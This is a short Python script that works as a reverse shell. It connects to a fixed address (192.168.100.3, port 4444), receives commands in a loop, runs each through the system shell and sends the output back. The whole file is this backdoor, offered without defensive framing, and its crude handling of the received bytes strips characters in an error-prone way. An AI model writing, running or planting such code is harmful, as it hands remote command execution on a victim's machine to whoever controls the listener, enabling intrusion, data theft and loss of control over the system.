import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.100.3", 4444))


while True:
    command = connection.recv(1024)
    c = str(command)
    a = c.replace(c[0], "")
    s = a.replace(a[0], "")
    # print(s)
    command_result = execute_system_command(str(s))
    connection.send(command_result)

connection.close()
